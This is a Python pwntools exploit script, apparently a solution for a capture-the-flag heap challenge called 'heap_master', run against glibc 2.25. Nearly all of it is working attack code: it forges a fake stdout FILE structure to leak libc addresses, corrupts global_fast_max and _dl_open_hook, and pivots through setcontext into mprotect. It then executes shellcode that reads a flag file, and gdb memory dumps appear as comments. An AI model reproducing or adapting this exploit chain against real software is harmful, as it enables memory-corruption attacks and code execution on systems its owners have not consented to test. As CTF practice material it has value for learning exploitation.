from pwn import *
def cmd(c):
	p.sendlineafter(">> ",str(c))
def add(size):
	cmd(1)
	p.sendlineafter("size: ",str(size))
def edit(off,c):
	cmd(2)
	p.sendlineafter("set: ",str(off))
	p.sendlineafter("size: ",str(len(c)))
	p.sendafter("content: ",c)
def free(off):
	cmd(3)
	p.sendlineafter("set: ",str(off))
#context.log_level='debug'
context.arch='amd64'
p=process('./heap_master',env={'LD_PRELOAD':"/glibc/x64/2.25/lib/libc-2.25.so"})
#p=process("./heap_master",env={'LD_PRELOAD':"./libc.so.6"})
libc=ELF("/glibc/x64/2.25/lib/libc-2.25.so")
#libc=ELF("./libc.so.6")

##FAKE STDOUT 's off:0x620
for x in range(14):
	edit(0x610+x*0x10,p64(0)+p64(0x301))
edit(0x900,p64(0x21)*0x30)
for x in range(14):
	free(0x620+0x10*(13-x))
	add(0x2f8)
# so lets fill the fake chunk like... ooh , our fake_Stdout start's off:0x1000
'''
0x7ffff7dd5600 <_IO_2_1_stdout_>:	0x00000000fbad2887	0x00007ffff7dd5683
0x7ffff7dd5610 <_IO_2_1_stdout_+16>:	0x00007ffff7dd5683	0x00007ffff7dd5683
0x7ffff7dd5620 <_IO_2_1_stdout_+32>:	0x00007ffff7dd5683	0x00007ffff7dd5683
0x7ffff7dd5630 <_IO_2_1_stdout_+48>:	0x00007ffff7dd5683	0x00007ffff7dd5683
0x7ffff7dd5640 <_IO_2_1_stdout_+64>:	0x00007ffff7dd5684	0x0000000000000000
0x7ffff7dd5650 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd5660 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007ffff7dd48c0
0x7ffff7dd5670 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
0x7ffff7dd5680 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007ffff7dd6760
0x7ffff7dd5690 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dd56a0 <_IO_2_1_stdout_+160>:	0x00007ffff7dd4780	0x0000000000000000
0x7ffff7dd56b0 <_IO_2_1_stdout_+176>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd56c0 <_IO_2_1_stdout_+192>:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dd56d0 <_IO_2_1_stdout_+208>:	0x0000000000000000	0x00007ffff7dd1440

'''



edit(0x620,p64(0xfbad1800)+"\x00".ljust(0x10,'\x00')+'\x00\x50')
#edit(0x640,'\x83\x56')
for x in range(4):
	edit(0x648+x*8,'\x83\x56')
edit(0x660,'\x84')
edit(0x668,'\x00'*0x20)
edit(0x688,'\xc0\x48')
edit(0x690,p64(1)+p64(0xffffffffffffffff)+p64(0x000000000a000000)+'\x60\x67')
edit(0x6b0,p64(0xffffffffffffffff)+p64(0)+'\x80\x47')
edit(0x6c8,p64(0)*3+p64(0x00000000ffffffff)+p64(0)*2+'\x40\x14')
#D0ne.... so let's get the control of global fast max
edit(0,p64(0)+p64(0x91)+'\x00'*0x88+p64(0x21)*5)
free(0x10)
edit(0x10,p64(0)+'\xc0\x67')
add(0x88)

# get it!
edit(0x620,p64(0xfbad1800)+p64(0x17e1))
edit(0x620+0x17d8,p64(0x21)*0x20)

free(0x630)
p.read(0x10)
magic=u64(p.read(8))
p.read(0x10)
base=u64(p.read(8))-(0x7ffff7dd4b68-0x7ffff7a37000)-(0x7ffff7a37000-0x7ffff7a3b000)
log.warning(hex(magic))
log.warning(hex(base))

libc.address=base
# Modify the _dl_open_hook
n=0x18+2283-10
edit(0x1000,p64(0)+p64(0x10*n+1)+'\x00'*(0x10*n-8)+p64(0x21)*5)
free(0x1010)

# _dl_open_hook get  

# _IO_list_all 0x7ffff7dd5500
payload=p64(0x7ffff7b15e89-0x7ffff7a3b000+base)+p64(0x7ffff7a7d4d5-0x7ffff7a3b000+base)+p64(0)
payload=payload.ljust(0x68)+p64(magic)+p64(0x10000)
payload=payload.ljust(0x88)+p64(0x7)
payload=payload.ljust(0xa0,'\x00')+p64(magic+0x2964)+p64(libc.sym['mprotect'])
edit(0x1000,payload)
shellcode='''
xor rax,rax
xor rdi,rdi
xor rdx,rdx
xor rsi,rsi
mov al,2
mov rdi,0x0067616c662f2e
sub rsp,0x100
push rdi
mov rdi,rsp
syscall
mov al,0
mov rdi,4
mov rsi,{}
mov rdx,0x100
syscall
mov al,1
mov rdi,1
mov rsi,{}
mov rdx,0x23
syscall
'''
shellcode=shellcode.format(hex(magic+0x2699),hex(magic+0x2699))
n132=asm(shellcode)
edit(0x2964,p64(magic+0x296c)+n132)
'''
   0x7ffff7a7d4d5 <setcontext+53>:	mov    rsp,QWORD PTR [rdi+0xa0]
   0x7ffff7a7d4dc <setcontext+60>:	mov    rbx,QWORD PTR [rdi+0x80]
   0x7ffff7a7d4e3 <setcontext+67>:	mov    rbp,QWORD PTR [rdi+0x78]
n132>>> 
   0x7ffff7a7d4e7 <setcontext+71>:	mov    r12,QWORD PTR [rdi+0x48]
   0x7ffff7a7d4eb <setcontext+75>:	mov    r13,QWORD PTR [rdi+0x50]
   0x7ffff7a7d4ef <setcontext+79>:	mov    r14,QWORD PTR [rdi+0x58]
   0x7ffff7a7d4f3 <setcontext+83>:	mov    r15,QWORD PTR [rdi+0x60]
   0x7ffff7a7d4f7 <setcontext+87>:	mov    rcx,QWORD PTR [rdi+0xa8]
   0x7ffff7a7d4fe <setcontext+94>:	push   rcx
   0x7ffff7a7d4ff <setcontext+95>:	mov    rsi,QWORD PTR [rdi+0x70]
   0x7ffff7a7d503 <setcontext+99>:	mov    rdx,QWORD PTR [rdi+0x88]
n132>>> 
   0x7ffff7a7d50a <setcontext+106>:	mov    rcx,QWORD PTR [rdi+0x98]
   0x7ffff7a7d511 <setcontext+113>:	mov    r8,QWORD PTR [rdi+0x28]
   0x7ffff7a7d515 <setcontext+117>:	mov    r9,QWORD PTR [rdi+0x30]
   0x7ffff7a7d519 <setcontext+121>:	mov    rdi,QWORD PTR [rdi+0x68]
   0x7ffff7a7d51d <setcontext+125>:	xor    eax,eax
   0x7ffff7a7d51f <setcontext+127>:	ret 
'''
'''

gdb.attach(p,"""
b _IO_vtable_check
""")
'''
free(299)
p.interactive()
'''
_dl_open_hook:0x7ffff7dd62e0
stdout:0x7ffff7dd2708
global_fast_max:0x7ffff7dd67d0
'''
